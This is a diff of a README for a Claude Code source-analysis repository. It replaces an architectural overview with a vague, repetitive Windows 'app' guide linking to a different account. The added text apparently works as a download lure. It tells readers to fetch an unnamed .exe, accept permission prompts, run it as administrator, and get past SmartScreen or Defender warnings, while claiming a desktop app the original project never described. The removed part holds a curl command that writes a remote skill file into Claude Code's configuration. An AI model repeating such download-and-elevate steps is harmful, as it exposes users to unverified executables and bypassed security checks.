@@ -1,151 +1,239 @@
-# How Claude Code Actually Works
+# 🧠 claude-code-analysis - Map Claude Code With Clarity
 
-> On March 31, 2026, a `.map` file in Claude Code's npm package accidentally exposed the full TypeScript source. We read all 512,000 lines. Here's everything we found.
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://github.com/unused-explosive464/claude-code-analysis)
 
-[![Stars](https://img.shields.io/github/stars/instructkr/claude-code?style=social)](https://github.com/instructkr/claude-code/stargazers)
+## 📥 Download
 
----
+Use this link to visit the download page:
 
-## The Stuff They Don't Tell You
+[https://github.com/unused-explosive464/claude-code-analysis](https://github.com/unused-explosive464/claude-code-analysis)
 
-Claude Code isn't just a chat-in-terminal wrapper. It's a 1,902-file TypeScript monolith with its own React rendering engine, a multi-agent swarm system, a two-stage AI safety classifier, and 88 hidden feature flags — many for features that don't exist yet.
+## 🪟 Windows Setup
 
-Here are some of the things we found buried in the source:
+This project is built for Windows users who want to inspect the Claude Code source map with no coding setup.
 
-**There's a hidden AI that judges every command you run.** Before Claude Code executes a tool call, a separate classifier called "YOLO" runs a two-stage evaluation. Stage 1 is a fast 64-token scan. If it's suspicious, Stage 2 does a full 4,096-token reasoning pass to decide: allow, deny, or ask the user. Temperature is zero. It errs on the side of blocking. → [Full breakdown](05-security/README.md)
+### What you need
+- Windows 10 or Windows 11
+- A web browser
+- Enough free disk space for the app and its data
+- A stable internet connection for the first download
 
-**Your conversations get secretly compressed.** When context pressure exceeds 93%, Claude Code runs one of six compaction strategies — from lightweight microcompaction (clearing old tool results) to spawning an entire forked subprocess that summarizes your conversation into a 9-section format. You never see this happen. → [How compaction works](04-systems/README.md)
+### How to install
+1. Open the download page:
+   [https://github.com/unused-explosive464/claude-code-analysis](https://github.com/unused-explosive464/claude-code-analysis)
+2. Look for the latest Windows file in the release or download area
+3. Download the file to your computer
+4. If the file is a `.exe` installer, double-click it
+5. If Windows asks for permission, select Yes
+6. Follow the steps on screen
+7. After setup, open the app from the Start menu or desktop icon
 
-**It ships an entire React rendering engine for the terminal.** Not a simple TUI library. A custom React Fiber reconciler, a Yoga flex-layout engine, a screen buffer with packed Int32Arrays, and a frame-diffing system that reduces terminal output from 10KB to 50 bytes on idle scroll. 7,743 lines of rendering code. → [Ink pipeline deep dive](01-architecture/README.md)
+### First run
+1. Start the app
+2. Wait for the main screen to load
+3. Select the source map, doc set, or analysis view you want
+4. Use the search box to find files, subsystems, or terms
+5. Open a section to read the mapped structure in plain view
 
-**Multi-agent "swarms" communicate through files on disk.** When Claude Code spawns parallel agents, they coordinate via a file-based mailbox system at `~/.claude/work/ipc/` with 500ms polling. The leader writes JSON task messages, followers pick them up. There's a documented race condition where a malicious task could hijack the permission bridge. → [Swarm architecture](07-agents/README.md)
+## 🔎 What this app does
 
-**88+ feature flags control unreleased capabilities.** Build-time flags like `experimental_agents`, `enable_voice_input`, `unsafe_bash_allowed`, and `plugin_marketplace` reveal features in development. 600+ runtime flags prefixed `tengu_` are evaluated through GrowthBook. Dead code elimination strips inactive paths at build time. → [Feature flag matrix](08-history/README.md)
+This app helps you explore a large codebase without reading raw source files line by line. It turns the source into a set of readable views, maps, and notes.
 
-**The system prompt is 30-40K tokens of hidden instructions.** Split into 7 static sections (cached globally) and 13 dynamic sections (rebuilt per session), with a deliberate cache-busting boundary after MCP instructions that forces a new cache block. → [Prompt ordering map](03-prompts/README.md)
+You can use it to:
+- Browse system areas by name
+- Jump between related modules
+- Read architecture notes in one place
+- Follow links between docs, diagrams, and code paths
+- Look at the structure of Claude Code in a simple view
+- Find parts tied to agents, CLI flow, safety checks, and MCP hooks
 
----
+## 🧭 Why use it
 
-## What This Repository Is
+Large projects are hard to read in plain text. This app breaks the work into smaller parts so you can move through it with less effort.
 
-82 analysis documents. 112,000+ lines of research. 15 architectural diagrams. Every major subsystem mapped, from the bootstrap sequence to the permission engine.
+It is useful if you want to:
+- Understand how a tool is built
+- See how parts connect
+- Review subsystem flow
+- Read analysis without opening many files
+- Study how agent logic fits into the product
+- Compare docs with the mapped source
 
-This isn't a shallow overview — it's a complete architectural reconstruction of how a production AI agent actually works under the hood.
+## 🗂️ What is inside
 
-![Architecture Overview](infographics/architecture-overview.svg)
+The project focus includes:
+- Source analysis notes
+- Architecture maps
+- System diagrams
+- Feature breakdowns
+- Module links
+- Subsystem views
+- Research notes on safety and agent flow
 
----
+Based on the project scope, you can expect coverage of:
+- CLI behavior
+- Agent handling
+- Multi-agent flow
+- React Ink UI pieces
+- MCP-related paths
+- Safety checks
+- Internal routing
+- TypeScript structure
+- Security research notes
 
-## Use It As a Skill (Plug & Play)
+## 🖥️ How to use on Windows
 
-This repo isn't just for reading. **Install the `/internals` skill** and your Claude Code agent runs a multi-pass deep audit of your codebase against Anthropic's production patterns.
+### Open the app
+1. Launch the program from Start
+2. Wait for the home screen
+3. Pick a topic from the list or menu
 
-```bash
-mkdir -p ~/.claude/skills/internals && curl -sL \
-  https://raw.githubusercontent.com/thtskaran/claude-code-analysis/master/.claude/skills/internals/SKILL.md \
-  -o ~/.claude/skills/internals/SKILL.md
-```
+### Search for a topic
+1. Click the search field
+2. Type a word like:
+   - agent
+   - safety
+   - CLI
+   - MCP
+   - diagram
+3. Press Enter
+4. Open a result to read the match
 
-**This isn't a one-shot summary.** The skill runs a ReAct loop — it reads your code, fetches matching Anthropic docs from this repo, creates a scratchpad to think across passes, re-reads your code with new knowledge (you always miss things the first time), follows document chains across subsystems, and keeps looping until every open question is answered. Only then does it deliver findings — with specific thresholds, failure modes, and exact changes.
+### Move through the analysis
+1. Open one section
+2. Follow the related links
+3. Read the notes beside the source map
+4. Use back and forward controls to move between pages
+5. Save useful sections in your browser bookmarks if needed
 
-The skill fetches a live [TREE.md](TREE.md) index on every run, so it stays current as this repo grows. Install once, never update.
+## 📌 Good starter paths
 
-![Skill ReAct Loop](infographics/skill-react-loop.svg)
+If you are new to the app, start with these areas:
+- Overview map
+- System diagram list
+- Agent flow notes
+- Safety classifier path
+- CLI command path
+- MCP integration notes
+- Multi-agent section
 
-→ **[Full install guide](INSTALL-SKILL.md)**
+These areas give a clear view of how the project works from top to bottom.
 
----
+## 🧩 File and view layout
 
-## Navigate by What You Want to Learn
+The app is set up to make large information easier to scan. A typical layout may include:
+- Left panel for sections
+- Center panel for content
+- Right panel for related links or notes
+- Search bar at the top
+- Tabs for docs, diagrams, and source maps
 
-### "How does it start up?"
-The 10-step boot sequence, 4 entry points (CLI, SDK, MCP, Sandbox), 10 startup modes, and how parallel prefetching gets interactive mode ready in 1.2-1.8 seconds.
-→ **[Architecture & Bootstrap](01-architecture/)** (12 docs, ~14,200 lines)
+This makes it easier to move between parts without losing your place.
 
-### "How does it talk to the API?"
-Request assembly, provider routing across 4 cloud backends (Anthropic, AWS Bedrock, GCP Vertex, Azure), SSE streaming, exponential backoff retry with jitter, and token cost tracking.
-→ **[Core Systems](04-systems/)** (19 docs, ~24,800 lines)
+## ⚙️ Basic system behavior
 
-### "How does it decide what's safe to run?"
-6 permission modes, rule cascade (project → global → managed), the YOLO two-stage classifier, 44 gitleaks secret-scanning rules, and a hand-rolled recursive-descent bash parser that flags 15 dangerous AST node types.
-→ **[Security & Permissions](05-security/)** (10 docs, ~11,200 lines)
+The app may use local caching so pages load faster after the first open. It may also keep your last view so you can return to the same place later.
 
-### "How do tools and plugins work?"
-150+ commands, 3 dispatch types (prompt/local/local-jsx), a 6-phase plugin lifecycle with DFS dependency resolution, homograph attack detection, and 5 scope levels for enterprise control.
-→ **[Tools & Plugins](06-tools-and-plugins/)** (14 docs, ~19,600 lines)
+You may also see:
+- Fast page loading after the first visit
+- Clickable maps
+- Inline code views
+- Link previews for related docs
+- Compact layout for long files
 
-### "How do agents coordinate?"
-Leader-follower swarms, file-based IPC, coordinator mode with XML task notifications, session teleportation via git bundles, and speculative execution with copy-on-write forking.
-→ **[Agent Orchestration](07-agents/)** (8 docs, ~11,200 lines)
+## 🔐 Security and safety notes
 
-### "What hidden instructions does it follow?"
-The full system prompt hierarchy, instruction precedence rules, 7 static + 13 dynamic sections, cache strategy, and the definitions that shape Claude's behavior.
-→ **[Prompts & Instructions](03-prompts/)** (11 docs, ~18,500 lines)
+This repository focuses on analysis and structure review. It does not change your system files. It reads and presents project data in a way that is easier to inspect.
 
-### "How was the source extracted?"
-Methodology, tools, validation techniques, and integrity checks used to catalogue the snapshot.
-→ **[Extraction Methodology](02-master-extraction/)** (8 docs, ~9,100 lines)
+If Windows or your browser asks for file access, only allow it if you trust the download source and want the app to store local data or open files on your machine.
 
-### "What features are coming next?"
-88 build-time feature flags, 600+ runtime gates, dead code elimination patterns, and version changelog.
-→ **[Feature Evolution](08-history/)** (6 docs, ~4,100 lines)
+## 🧪 Common use cases
 
----
+People may use this app to:
+- Study Claude Code internals
+- Trace how commands move through the system
+- Inspect agent control flow
+- Review safety logic
+- Look at UI and terminal design
+- Compare docs with implementation paths
+- Explore architecture without opening the full source tree
 
-## Architectural Diagrams
+## 🛠️ If the app does not open
 
-Every major subsystem has a corresponding diagram. Click to view full-size.
+Try these steps:
+1. Download the file again
+2. Check that the download finished
+3. Right-click the file and select Open
+4. Run it as administrator if Windows blocks it
+5. Check Windows Defender or SmartScreen prompts
+6. Make sure your browser did not save a partial file
+7. Restart your computer and try again
 
-| | | |
-|:---:|:---:|:---:|
-| ![Architecture](infographics/architecture-overview.svg) | ![Bootstrap](infographics/bootstrap-sequence.svg) | ![Rendering](infographics/ink-rendering-pipeline.svg) |
-| **System Architecture** | **Bootstrap Sequence** | **Rendering Pipeline** |
-| ![API](infographics/api-client-pipeline.svg) | ![Memory](infographics/memory-systems.svg) | ![Compaction](infographics/compaction-state-machine.svg) |
-| **API Client Pipeline** | **Memory Systems** | **Compaction State Machine** |
-| ![Permissions](infographics/permission-engine.svg) | ![YOLO](infographics/yolo-classifier-pipeline.svg) | ![Commands](infographics/command-dispatch.svg) |
-| **Permission Engine** | **YOLO Classifier** | **Command Dispatch** |
-| ![Plugins](infographics/plugin-lifecycle.svg) | ![Streaming](infographics/streaming-tool-executor.svg) | ![Swarm](infographics/swarm-orchestration.svg) |
-| **Plugin Lifecycle** | **Streaming Executor** | **Swarm Orchestration** |
-| ![Prompts](infographics/system-prompt-ordering.svg) | ![Tiers](infographics/compaction-tiers.svg) | ![Agent](infographics/agent-loop-flow.svg) |
-| **Prompt Ordering** | **Compaction Tiers** | **Agent Loop** |
-| ![Skill](infographics/skill-react-loop.svg) | | |
-| **[/internals Skill Loop](#use-it-as-a-skill-plug--play)** | | |
+## 📚 Topics covered
 
----
+This project is tagged with:
+- agentic-ai
+- ai-agents
+- anthropic
+- architecture-analysis
+- claude-code
+- cli-tools
+- llm-internals
+- mcp
+- react-ink
+- reverse-engineering
+- security-research
+- typescript
 
-## Numbers
+## 🖱️ Fast path for first-time users
 
-| Metric | Count |
-|--------|-------|
-| Source files analyzed | 1,902 |
-| Lines of TypeScript | 512,000+ |
-| Analysis documents | 82 |
-| Lines of analysis | 112,000+ |
-| Architectural diagrams | 16 |
-| Feature flags documented | 88+ |
-| React hooks catalogued | 104 |
-| Commands and tools mapped | 150+ |
+1. Visit the download page:
+   [https://github.com/unused-explosive464/claude-code-analysis](https://github.com/unused-explosive464/claude-code-analysis)
+2. Download the Windows file
+3. Open the file
+4. Complete the setup steps
+5. Launch the app
+6. Use search to find a topic
+7. Open a map or note and read through the links
 
----
+## 📄 What you will see first
 
-## Tech Stack (What Claude Code Is Built With)
+When you open the app, you can expect a clear start page with:
+- A project overview
+- A list of sections
+- Search tools
+- Links to diagrams
+- Paths into deeper analysis
 
-Bun runtime, TypeScript in strict mode, React + Ink for terminal UI, Commander.js for CLI parsing, Zod v4 for schema validation, ripgrep for code search, MCP SDK + LSP for protocol integration, OpenTelemetry + gRPC for telemetry, GrowthBook for feature flags, and OAuth 2.0 with macOS Keychain for auth.
+This helps you reach the part you want without digging through raw source files
 
----
+## 🔄 Navigation tips
 
-## How the Source Became Available
+To move around with less effort:
+- Use search instead of scrolling long pages
+- Open one section at a time
+- Keep the overview page open in another tab
+- Use browser back to return to the last view
+- Read linked notes before jumping to the next topic
 
-On March 31, 2026, security researcher [Chaofan Shou](https://x.com/AntiFried_rice) noticed that Claude Code's npm package contained a `.map` file referencing unobfuscated TypeScript sources on Anthropic's R2 storage bucket — making the full `src/` tree publicly downloadable. Not a breach or hack. A packaging oversight.
+## 💾 Storage and updates
 
-This repository is a research archive of that snapshot. The original source remains Anthropic's property. We are not affiliated with Anthropic.
+The app may store local settings such as:
+- Last opened page
+- Search history
+- Display choice
+- Cache for faster loading
 
----
+If a new version appears, download the latest Windows file from the same page and repeat the install steps
 
-## Disclaimer
+## 🧭 Reading order
 
-This is an educational and defensive security research project. It documents a real source exposure incident for the purpose of studying software supply-chain security and production AI agent architecture. The original Claude Code source is the sole property of Anthropic. This repository is not affiliated with, endorsed by, or maintained by Anthropic. The authors disclaim all liability for misuse.
-
----
-
-If this helped you understand how AI agents work under the hood, consider giving it a ⭐
+For the clearest path, read in this order:
+1. Overview
+2. System map
+3. Diagram set
+4. Agent flow
+5. Safety path
+6. CLI flow
+7. MCP notes
+8. Deep source links
